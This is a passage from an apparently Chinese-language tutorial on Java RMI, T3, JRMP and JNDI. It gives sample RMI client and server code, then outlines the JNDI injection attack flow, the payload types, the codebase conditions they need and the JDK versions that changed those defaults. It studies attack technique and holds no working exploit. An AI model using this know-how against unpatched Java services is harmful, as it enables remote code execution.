name&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;23&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;method&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;age&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;24&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// execute object server&#39;s business method&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;25&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; myServer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;26&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;27&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;28&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// return result to stub&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;29&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeInt&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;age&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;30&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;31&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;32&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token keyword&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;method&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;equals&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;name&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;33&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// execute object server&#39;s business method&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;34&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; myServer&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;35&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt; outStream &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;36&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                        &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;ObjectOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;socket&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getOutputStream&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;37&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    &lt;span class=&#34;token comment&#34;&gt;// return result to stub&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;38&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;writeObject&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;39&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                    outStream&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;flush&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;40&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;                &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;41&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;42&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;43&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;44&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exit&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;45&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;46&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;47&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; args &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;48&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token comment&#34;&gt;// new object server&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;49&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt; person &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonServer&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Richard&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;34&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;50&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt; skel &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Skeleton&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;person&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;51&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        skel&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;start&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;52&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;53&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;client实现&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#client实现&#34;&gt;#&lt;/a&gt; Client 实现&lt;/h3&gt;
&lt;figure class=&#34;highlight java&#34;&gt;&lt;figcaption data-lang=&#34;java&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;PersonClient&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;void&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt; args&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token keyword&#34;&gt;try&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt; person &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person_Stub&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; person&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getAge&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;String&lt;/span&gt; name &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; person&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;getName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            &lt;span class=&#34;token class-name&#34;&gt;System&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;out&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;println&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;name &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; is &#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; age &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#34; years old&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;catch&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token class-name&#34;&gt;Throwable&lt;/span&gt; t&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;            t&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;printStackTrace&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;10&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;        &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;11&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;12&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;t3协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#t3协议&#34;&gt;#&lt;/a&gt; T3 协议&lt;/h2&gt;
&lt;p&gt;T3 协议是用于在 WebLogic 服务器和其他类型的 Java 程序之间传输信息的协议，是 Weblogic 对 RMI 规范的实现。简单来说，可以把 T3 视为暴露 JDNI 给用户调用的接口。&lt;/p&gt;
&lt;h2 id=&#34;jrmp&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jrmp&#34;&gt;#&lt;/a&gt; JRMP&lt;/h2&gt;
&lt;p&gt;Java 远程方法协议 (Java Remote Method Protocol，JRMP) 是特定于 Java 技术的、用于查找和引用远程对象的协议。这是运行在 Java 远程方法调用 (RMI) 之下、TCP/IP 之上的线路层协议。&lt;/p&gt;
&lt;p&gt;JRMP 是一个 Java 特有的、适用于 Java 之间远程调用的基于流的协议，要求客户端和服务器上都使用 Java 对象。&lt;/p&gt;
&lt;h1 id=&#34;jndi&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi&#34;&gt;#&lt;/a&gt; JNDI&lt;/h1&gt;
&lt;h2 id=&#34;简介-12&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-12&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;JNDI (Java Naming and Directory Interface，Java 命名和目录接口) 是为 Java 应用程序提供命名和目录访问服务的 API，允许客户端通过名称发现和查找数据、对象，用于提供基于配置的动态调用。这些对象可以存储在不同的命名或目录服务中，例如 RMI、CORBA、LDAP、DNS 等。&lt;/p&gt;
&lt;p&gt;其中 Naming Service 类似于哈希表的 K/V 对，通过名称去获取对应的服务。Directory Service 是一种特殊的 Naming Service，用类似目录的方式来存取服务。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/11/27/e7VaR9mvNITk6U1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;jndi注入&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jndi注入&#34;&gt;#&lt;/a&gt; JNDI 注入&lt;/h2&gt;
&lt;p&gt;JNDI 注入是 2016 年由 pentester 在 BlackHat USA 上的  &lt;code&gt;A Journey From JNDI LDAP Manipulation To RCE&lt;/code&gt;  议题提出的。&lt;/p&gt;
&lt;p&gt;其攻击过程如下&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;攻击者将 Payload 绑定到攻击者的命名 / 目录服务中&lt;/li&gt;
&lt;li&gt;攻击者将绝对 URL 注入易受攻击的 JNDI 查找方法&lt;/li&gt;
&lt;li&gt;应用程序执行查找&lt;/li&gt;
&lt;li&gt;应用程序连接到攻击者控制的 JNDI 服务并返回 Payload&lt;/li&gt;
&lt;li&gt;应用程序解码响应并触发有效负载&lt;/li&gt;
&lt;/ol&gt;
&lt;h2 id=&#34;攻击载荷&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#攻击载荷&#34;&gt;#&lt;/a&gt; 攻击载荷&lt;/h2&gt;
&lt;p&gt;JDNI 主要有几种攻击载荷：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CORBA&lt;/li&gt;
&lt;li&gt;IOR&lt;/li&gt;
&lt;li&gt;JNDI Reference&lt;/li&gt;
&lt;li&gt;LDAP&lt;/li&gt;
&lt;li&gt;Remote Location&lt;/li&gt;
&lt;li&gt;Remote Object&lt;/li&gt;
&lt;li&gt;RMI&lt;/li&gt;
&lt;li&gt;Serialized Object&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;rmi-remote-object&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi-remote-object&#34;&gt;#&lt;/a&gt; RMI Remote Object&lt;/h3&gt;
&lt;p&gt;攻击者实现一个 RMI 恶意远程对象并绑定到 RMI Registry 上，将编译后的 RMI 远程对象类放在 HTTP/FTP/SMB 等服务器上。其中 Codebase 地址由远程服务器的  &lt;code&gt;java.rmi.server.codebase&lt;/code&gt;  属性设置，供受害者的 RMI 客户端远程加载。&lt;/p&gt;
&lt;p&gt;利用条件如下：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;RMI 客户端的上下文环境允许访问远程 Codebase。&lt;/li&gt;
&lt;li&gt;属性  &lt;code&gt;java.rmi.server.useCodebaseOnly&lt;/code&gt;  的值为 false。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;其中 JDK 6u45、7u21 后， &lt;code&gt;java.rmi.server.useCodebaseOnly&lt;/code&gt;  的值默认为 true。&lt;/p&gt;
&lt;h3 id=&#34;rmi-jndi-reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#rmi-jndi-reference&#34;&gt;#&lt;/a&gt; RMI + JNDI Reference&lt;/h3&gt;
&lt;p&gt;攻击者通过 RMI 服务返回一个 JNDI Naming Reference，受害者解码 Reference 时会去攻击者指定的远程地址加载 Factory 类。这种方式原理上并非使用 RMI Class Loading 机制，因此不受  &lt;code&gt;java.rmi.server.useCodebaseOnly&lt;/code&gt;  系统属性的限制。但是在 JDK 6u132, JDK 7u122, JDK 8u113 后限制了 Naming/Directory 服务中 JNDI Reference 远程加载 Object Factory 类的特性。系统属性  &lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  、  &lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  的默认值变为 false，即默认不允许从远程的 Codebase 加载 Reference 工厂类。&lt;/p&gt;
&lt;h3 id=&#34;ldap-jndi-reference&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ldap-jndi-reference&#34;&gt;#&lt;/a&gt; LDAP + JNDI Reference&lt;/h3&gt;
&lt;p&gt;Java 的 LDAP 可以在属性值中存储特定的 Java 对象，且 LDAP 服务的 Reference 远程加载 Factory 类不受  &lt;code&gt;com.sun.jndi.rmi.object.trustURLCodebase&lt;/code&gt;  、 &lt;code&gt;com.sun.jndi.cosnaming.object.trustURLCodebase&lt;/code&gt;  等属性的限制，适用范围更广。&lt;/p&gt;
&lt;h1 id=&#34;jdk-2&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-2&#34;&gt;#&lt;/a&gt; JDK&lt;/h1&gt;
&lt;h2 id=&#34;jdk-8&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jdk-8&#34;&gt;#&lt;/a&gt; JDK 8&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;sun.net.www.protocol&lt;/code&gt;  不再支持 gopher 协议&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;8u251&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#8u251&#34;&gt;#&lt;/a&gt; 8u251&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;com.sun.org.apache.bcel.internal.util.ClassLoader 类被删除&lt;/li&gt;
&lt;/ul&gt;
